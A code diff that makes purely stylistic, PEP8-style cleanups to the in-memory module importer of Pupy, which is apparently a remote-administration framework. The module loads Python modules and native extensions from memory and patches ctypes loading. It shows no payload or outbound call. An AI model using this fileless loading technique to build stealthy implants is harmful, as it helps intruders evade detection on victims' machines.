@@ -16,7 +16,10 @@
 # This module uses the builtins modules pupy and _memimporter to load python modules and packages from memory, including .pyd files (windows only)
 # Pupy can dynamically add new modules to the modules dictionary to allow remote importing of python modules from memory !
 #
-import sys, imp, marshal, gc
+import sys
+import imp
+import marshal
+import gc
 
 if hasattr(sys.platform, 'addtarget'):
     sys.platform.addtarget(None)
@@ -197,7 +200,7 @@ def py_memimporter():
     INITIALIZER = ctypes.PYFUNCTYPE(None)
 
     class MemImporter(object):
-        __slots__ = ( '_create_tmpfile' )
+        __slots__ = ('_create_tmpfile')
 
         def __init__(self, create_tmpfile):
             self._create_tmpfile = create_tmpfile
@@ -356,7 +359,7 @@ def get_module_files(fullname):
 
     if len(files) > 1:
         # If we have more than one file, than throw away dlls
-        retfiles = [ x for x in files if not x.endswith('.dll') ]
+        retfiles = [x for x in files if not x.endswith('.dll')]
         del files[:]
         return retfiles
 
@@ -480,8 +483,7 @@ def invalidate_module(name):
                 for obj in gc.get_objects():
                     if id(obj) == mid:
                         dprint('Module {} still referenced by {}'.format(
-                            item, [ id(x) for x in gc.get_referrers(obj) ]
-                        ))
+                            item, [id(x) for x in gc.get_referrers(obj)]))
 
     gc.collect()
 
@@ -492,8 +494,10 @@ class DummyPackageLoader(object):
         return sys.modules[fullname]
 
 class PupyPackageLoader(object):
-    __slots__ = ( 'fullname', 'contents', 'extension',
-                      'is_pkg', 'path', 'archive' )
+    __slots__ = (
+        'fullname', 'contents', 'extension',
+        'is_pkg', 'path', 'archive'
+    )
 
     def __init__(self, fullname, contents, extension, is_pkg, path):
         self.fullname = fullname
@@ -619,9 +623,9 @@ class PupyPackageFinder(object):
 
         try:
             files=[]
-            if fullname in ( 'pywintypes', 'pythoncom' ):
+            if fullname in ('pywintypes', 'pythoncom'):
                 fullname = fullname + '27.dll'
-                files = [ fullname ]
+                files = [fullname]
             else:
                 files = get_module_files(fullname)
 
@@ -644,7 +648,7 @@ class PupyPackageFinder(object):
                         if part in modules or part in sys.modules:
                             return None
 
-                    if not PupyPackageFinder.search_lock is None:
+                    if PupyPackageFinder.search_lock is not None:
                         with PupyPackageFinder.search_lock:
                             if fullname in PupyPackageFinder.search_set:
                                 return None
@@ -675,7 +679,7 @@ class PupyPackageFinder(object):
                         dprint('Exception: {}'.format(e))
 
                     finally:
-                        if not PupyPackageFinder.search_lock is None:
+                        if PupyPackageFinder.search_lock is not None:
                             with PupyPackageFinder.search_lock:
                                 PupyPackageFinder.search_set.remove(fullname)
 
@@ -717,7 +721,7 @@ class PupyPackageFinder(object):
 
             extension = selected.rsplit(".",1)[1].strip().lower()
             is_pkg = any([
-                selected.endswith('/__init__'+ext) for ext in [ '.pye', '.pyo', '.pyc', '.py' ]
+                selected.endswith('/__init__'+ext) for ext in ['.pye', '.pyo', '.pyc', '.py']
             ])
 
             dprint('--> Loading {} ({}) package={}'.format(
@@ -746,7 +750,7 @@ class PupyPackageFinder(object):
             gc.collect()
 
 def native_import(name):
-    if not PupyPackageFinder.search_lock is None:
+    if PupyPackageFinder.search_lock is not None:
         with PupyPackageFinder.search_lock:
             if name in PupyPackageFinder.search_set:
                 return False
@@ -761,7 +765,7 @@ def native_import(name):
         return False
 
     finally:
-        if not PupyPackageFinder.search_lock is None:
+        if PupyPackageFinder.search_lock is not None:
             with PupyPackageFinder.search_lock:
                 PupyPackageFinder.search_set.remove(name)
 
@@ -790,7 +794,7 @@ def install(debug=None, trace=False):
     global __dprint_method
 
     if debug:
-       __debug = True
+        __debug = True
 
     if trace:
         __trace = trace
@@ -893,7 +897,7 @@ def install(debug=None, trace=False):
             name = name[name.find('pupy:')+5:]
             name = os.path.relpath(name)
             name = '/'.join([
-                x for x in name.split(os.path.sep) if x and not x in ( '.', '..' )
+                x for x in name.split(os.path.sep) if x and x not in ('.', '..')
             ])
 
         return name
@@ -933,7 +937,7 @@ def install(debug=None, trace=False):
         ctypes.CDLL_ORIG = ctypes.CDLL
 
         class PupyCDLL(ctypes.CDLL_ORIG):
-            __slots__ = ( '_FuncPtr_orig', '_FuncPtr', '_name' )
+            __slots__ = ('_FuncPtr_orig', '_FuncPtr', '_name')
 
             def __init__(self, name, **kwargs):
                 super(PupyCDLL, self).__init__(name, **kwargs)
